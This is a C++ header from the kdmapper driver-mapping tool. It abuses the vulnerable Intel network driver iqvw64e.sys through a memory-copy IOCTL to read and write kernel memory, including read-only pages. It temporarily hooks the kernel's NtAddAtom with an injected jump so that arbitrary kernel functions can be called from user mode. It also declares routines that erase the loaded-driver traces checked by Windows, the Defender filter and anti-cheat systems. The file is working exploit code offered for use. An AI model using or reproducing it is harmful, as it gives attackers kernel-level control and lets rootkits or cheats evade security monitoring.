#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <memory>
#include <stdint.h>

#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"

namespace intel_driver
{
	extern char driver_name[100]; //"iqvw64e.sys"
	constexpr uint32_t ioctl1 = 0x80862007;
	constexpr DWORD iqvw64e_timestamp = 0x5284EAC3;
	extern ULONG64 ntoskrnlAddr;

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _RTL_BALANCED_LINKS {
		struct _RTL_BALANCED_LINKS* Parent;
		struct _RTL_BALANCED_LINKS* LeftChild;
		struct _RTL_BALANCED_LINKS* RightChild;
		CHAR Balance;
		UCHAR Reserved[3];
	} RTL_BALANCED_LINKS;
	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;

	typedef struct _RTL_AVL_TABLE {
		RTL_BALANCED_LINKS BalancedRoot;
		PVOID OrderedPointer;
		ULONG WhichOrderedElement;
		ULONG NumberGenericTableElements;
		ULONG DepthOfTree;
		PVOID RestartKey;
		ULONG DeleteCount;
		PVOID CompareRoutine;
		PVOID AllocateRoutine;
		PVOID FreeRoutine;
		PVOID TableContext;
	} RTL_AVL_TABLE;
	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;

	typedef struct _PiDDBCacheEntry
	{
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		char			_0x0028[16]; // data from the shim engine, or uninitialized memory for custom drivers
	} PiDDBCacheEntry, * NPiDDBCacheEntry;

	typedef struct _HashBucketEntry
	{
		struct _HashBucketEntry* Next;
		UNICODE_STRING DriverName;
		ULONG CertHash[5];
	} HashBucketEntry, * PHashBucketEntry;

	bool ClearPiDDBCacheTable(HANDLE device_handle);
	bool ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(HANDLE device_handle, PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer);
	PiDDBCacheEntry* LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name);
	PVOID ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);

	uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList(HANDLE device_handle);
	bool ClearWdFilterDriverList(HANDLE device_handle);

	bool IsRunning();
	HANDLE Load();
	bool Unload(HANDLE device_handle);

	bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size);
	bool GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size);
	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);
	/*added by herooyyy*/
	uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size);
	bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect);
	
	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
	/*added by psec*/
	uint64_t MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes);
	uint64_t MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority);
	bool MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect);
	bool MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl);
	bool MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList);
	/**/

	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers(HANDLE device_handle);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		// Setup function call
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to load ntdll.dll" << std::endl); //never should happens
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom)
		{
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			return false;
		}

		// Overwrite the pointer with kernel_function_address
		if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
